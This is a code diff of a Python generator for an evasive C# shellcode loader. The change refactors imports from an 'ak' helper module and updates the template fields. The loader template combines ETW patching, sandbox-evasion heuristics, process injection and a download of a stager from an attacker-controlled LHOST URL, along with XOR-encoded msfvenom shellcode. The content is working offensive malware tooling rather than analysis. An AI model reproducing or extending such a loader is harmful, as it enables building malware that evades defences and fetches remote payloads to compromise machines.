@@ -1,5 +1,5 @@
 #!/bin/env python3
-from ak import *
+import ak
 import os
 import subprocess
 
@@ -19,9 +19,9 @@ SHELLCODE32_PATH = "/sc32"
 STAGER_URL = f"http://{LHOST}/sc"
 
 def generate():
-  svchost_path = Obfuscator(SVCHOST_PATH)
+  svchost_path = ak.Obfuscator(SVCHOST_PATH)
 
-  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)
+  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
   template = """
 using System;
@@ -33,30 +33,24 @@ namespace LeMans
 {{
     public class Class1
     {{
-        {START_PROCESS_INJECT_IMPORT}
-        {HEURISTICS_IMPORT}
-        {ARCH_DETECTION}
-        {ETW_FUNCS}
+        {ak.START_PROCESS_INJECT_IMPORT}
+        {ak.HEURISTICS_IMPORT}
+        {ak.ARCH_DETECTION}
+        {ak.ETW_FUNCS}
 
         public static void ferrari()
         {{
-            {HEURISTICS_CODE}
-            {ETW_PATCH}
+            {ak.HEURISTICS_CODE}
+            {ak.ETW_PATCH}
             {URL_DL_CODE}
 
-         {START_PROCESS_INJECT}
+         {ak.START_PROCESS_INJECT}
 
         }}
     }}
 }}
-""".format(HEURISTICS_IMPORT=HEURISTICS_IMPORT,
-           HEURISTICS_CODE=HEURISTICS_CODE,
-           ARCH_DETECTION=ARCH_DETECTION,
-           ETW_FUNCS=ETW_FUNCS,
-           ETW_PATCH=ETW_PATCH,
-           URL_DL_CODE=url_dl_code,
-           START_PROCESS_INJECT_IMPORT=START_PROCESS_INJECT_IMPORT,
-           START_PROCESS_INJECT=START_PROCESS_INJECT)
+""".format(ak=ak,
+           URL_DL_CODE=url_dl_code)
 
   print(template)
   f = open(BASE_FILENAME + '.cs', "w")
@@ -68,8 +62,8 @@ def compile():
   os.system(cmd)
 
 def generate_shellcode():
-  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
-  shellcode32 = ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)
+  shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
+  shellcode32 = ak.ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)
 
   # Write 64bit shellcode
   f = open(BASE_FILENAME + '.sc', "wb")
